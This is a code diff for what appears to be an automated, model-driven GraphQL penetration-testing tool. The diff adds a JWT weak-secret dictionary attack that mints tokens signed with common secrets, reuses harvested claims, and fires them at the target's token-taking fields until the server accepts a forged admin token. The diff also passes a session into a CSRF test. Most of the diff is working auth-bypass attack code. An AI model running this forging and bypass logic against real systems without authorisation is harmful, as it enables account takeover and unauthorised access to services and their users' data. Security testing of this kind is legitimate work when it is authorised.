@@ -58,7 +58,8 @@ def handle_visit(ctx: ActionContext, args: dict) -> Result:
     return Result(observation=obs, touched_target=True, is_dead=is_dead(status))
 
 
-def _autotest_token_sinks(ctx: ActionContext, token: str, approach: str) -> list[str]:
+def _autotest_token_sinks(ctx: ActionContext, token: str, approach: str,
+                          sink_cap: int = 6) -> list[str]:
     """Submit the forged `token` into every schema field that takes a token/jwt/auth arg, filling
     the field's other args with scalar defaults, and record an auth-bypass finding when the field
     returns data. Doing it here removes the fragile step of the model hand-copying a 3-segment JWT
@@ -70,7 +71,7 @@ def _autotest_token_sinks(ctx: ActionContext, token: str, approach: str) -> list
     sm = ctx.schema_map
     mroot = sm.get("_mutation_type", "Mutation")
     lines: list[str] = []
-    for sink in token_arg_fields(sm, cap=6):
+    for sink in token_arg_fields(sm, cap=sink_cap):
         m = re.match(r"(\w+)\((\w+)\)", sink)
         if not m:
             continue
@@ -126,23 +127,69 @@ def _autotest_token_sinks(ctx: ActionContext, token: str, approach: str) -> list
 def handle_forge_jwt(ctx: ActionContext, args: dict) -> Result:
     try:
         approach = str(args.get("approach", "none"))
-        token = tool_forge_jwt(approach, args.get("secret"),
-                               args.get("claims") if isinstance(args.get("claims"), dict) else None,
-                               ctx.harvested)
-        ctx.harvested.setdefault("forged_jwt", []).append(token)
-        tested = _autotest_token_sinks(ctx, token, approach)
-        obs = f"forged token: {token}"
-        if tested:
-            obs += ("\n  auto-tested against the field's token arg (no need to re-send by hand):\n    "
-                    + "\n    ".join(tested)
-                    + "\n  Also adopt via set_identity {\"Authorization\": \"Bearer <token>\"} to test the header path.")
+        secret = args.get("secret")
+        claims = args.get("claims") if isinstance(args.get("claims"), dict) else None
+        a = (approach or "none").lower()
+        if ("weak" in a or "secret" in a) and not secret:
+            obs = _forge_weak_secret_dictionary(ctx, claims)
         else:
-            obs += ("\n  no schema field takes a token/jwt/auth arg - adopt via set_identity "
-                    "{\"Authorization\": \"Bearer <token>\"} to test header-based acceptance.")
+            token = tool_forge_jwt(approach, secret, claims, ctx.harvested)
+            ctx.harvested.setdefault("forged_jwt", []).append(token)
+            tested = _autotest_token_sinks(ctx, token, approach)
+            obs = f"forged token: {token}"
+            if tested:
+                obs += ("\n  auto-tested against the field's token arg (no need to re-send by hand):\n    "
+                        + "\n    ".join(tested)
+                        + "\n  Also adopt via set_identity {\"Authorization\": \"Bearer <token>\"} to test the header path.")
+            else:
+                obs += ("\n  no schema field takes a token/jwt/auth arg - adopt via set_identity "
+                        "{\"Authorization\": \"Bearer <token>\"} to test header-based acceptance.")
     except Exception as e:  # noqa: BLE001
         obs = f"forge_jwt failed: {str(e)[:120]}"
     ctx.log(f"[{ctx.step}] forge_jwt -> {obs[:200]}")
     return Result(observation=obs, touched_target=True)
+
+
+def _forge_weak_secret_dictionary(ctx: ActionContext, claims: dict | None) -> str:
+    """Try the built-in common-secret list against the schema's token sinks in one action.
+
+    Mints one HS256 candidate per known weak secret (seeded with any harvested claims),
+    auto-tests each against up to 2 token-arg fields, and stops at the first acceptance
+    (recorded as a finding by _autotest_token_sinks).
+    """
+    from ...utils import jwt_attacks
+
+    base: dict = {}
+    for tok in ctx.harvested.get("jwt", []):
+        base = jwt_attacks.decode_payload(tok) or base
+        if base:
+            break
+    if isinstance(claims, dict):
+        base = {**base, **claims}
+
+    candidates = jwt_attacks.forged_tokens("jwt_weak_secret", base)
+    if not candidates:
+        return "weak_secret: no candidates minted (internal error)"
+    rejected: list[str] = []
+    tested_any = False
+    for label, token in candidates:
+        ctx.harvested.setdefault("forged_jwt", []).append(token)
+        tested = _autotest_token_sinks(ctx, token, label, sink_cap=2)
+        tested_any = tested_any or bool(tested)
+        if any("ACCEPTED" in t for t in tested):
+            return (f"⚠ weak-secret WIN: {label} - the server signed with a COMMON secret "
+                    f"({len(rejected) + 1} tried). Forged admin token: {token}\n    "
+                    + "\n    ".join(t for t in tested if t))
+        rejected.append(label)
+    head = f"weak_secret: none of the {len(candidates)} common secrets verified"
+    if tested_any:
+        return (head + " against the schema's token-arg fields (the signing secret is not a "
+                "common one, or tokens aren't read from field args). Secrets tried: "
+                + ", ".join(rejected))
+    return (head + " - no schema field takes a token/jwt/auth arg, so nothing was server-tested. "
+            f"{len(candidates)} candidate tokens minted (last one kept for auth_test); adopt one "
+            "via set_identity {\"Authorization\": \"Bearer <token>\"} to test the header path. "
+            "Secrets tried: " + ", ".join(rejected))
 
 
 @action("oob_url")
@@ -265,7 +312,8 @@ def handle_csrf(ctx: ActionContext, args: dict) -> Result:
         cookies = ctx.settings.get("target", {}).get("cookies") or {}
         mfields = ctx.schema_map.get(ctx.schema_map.get("_mutation_type", "Mutation"))
         n_mut = len([f for f in mfields if not str(f).startswith("_")]) if isinstance(mfields, dict) else 0
-        lines = tool_csrf(ctx.target_url, cookies, n_mutations=n_mut)
+        lines = tool_csrf(ctx.target_url, cookies, n_mutations=n_mut,
+                          session=getattr(ctx.client, "session", None))
     except Exception as e:  # noqa: BLE001
         obs = f"csrf failed: {str(e)[:120]}"
         ctx.log(f"[{ctx.step}] csrf -> {obs}")
